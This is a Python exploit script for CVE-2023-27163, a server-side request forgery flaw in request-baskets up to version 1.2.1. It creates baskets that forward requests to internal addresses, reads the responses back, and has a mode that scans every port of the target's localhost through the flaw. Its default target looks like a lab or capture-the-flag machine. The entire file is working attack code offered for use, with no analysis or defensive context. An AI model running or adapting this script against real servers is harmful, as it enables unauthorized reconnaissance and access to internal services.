#!/usr/bin/python3

import requests
import os
import random
import string
import re
try:
    from pwn import log
    from lowercase_booleans import true, false
    import argparse
except ImportError:
    os.system('/usr/bin/python3 -m pip install pwn lowercase_booleans argparse')

def createBasket(url, lhost, port):
    try:
        randomName = ''.join(random.choice(string.ascii_lowercase) for i in range(5))
        json = {
            "forward_url": f"http://{lhost}:{port}",
            "proxy_response": true,
            "insecure_tls": false,
            "expand_path": true,
            "capacity": 250
            }
        url = f"{url}/api/baskets/{randomName}"
        r = requests.post(url, json=json, verify=False, allow_redirects=False, headers={'Content-Type': 'application/json'}, proxies={'http': 'http://127.0.0.1:8080'})
        if r.status_code == 201:
            # log.success(f'Basket created: {url} - {r.text}')
            # print(r.json()['token'])
            return randomName, port, r.json()['token']
        else:
            log.failure(f'Occupied: {url}')
    except requests.exceptions.ConnectionError as request_ConnectionError:
        log.error(f'requests.exceptions.ConnectionError: {request_ConnectionError}')
        
def triggerSSRF(url, name):
    r = requests.get(f'{url}/{name}')
    # log.info(f'Triggering SSRF: {url}/{name} [{r.status_code}]')
    return r

def portScan(r, port, url, name):
    output = re.search('connection refused', r.text)
    if output is None:
        log.success(f'Port: {port} -> {url}/{name}')
        
def removeBracket(url, name, token):
    r = requests.delete(f'{url}/api/baskets/{name}', proxies={'http': 'http://127.0.0.1:8080'}, headers={'Authorization': token})

def main():
    parser = argparse.ArgumentParser(description='CVE-2023-27163: "request-baskets" <= v1.2.1 SSRF')
    parser.add_argument('action', choices=('scan-ports', 'ssrf'))
    parser.add_argument('-u', '--url', help='request-baskets URL', default='http://10.10.11.224:55555')
    parser.add_argument('-l', '--lhost', help='SSRF target IP', default='127.0.0.1')
    parser.add_argument('-p', '--port', help='Port to check', default='80')
    args = parser.parse_args()
    if args.action == 'ssrf':
        name, port, token = createBasket(args.url, args.lhost, args.port)
        log.success(triggerSSRF(args.url, name).text)
        removeBracket(args.url, name, token)
    elif args.action == 'scan-ports':
        for ports in range(1,65535):
            name, port, token = createBasket(args.url, args.lhost, ports)
            portScan(triggerSSRF(args.url, name), str(port), args.url, name)
            removeBracket(args.url, name, token)
    
if __name__ == "__main__":
    main()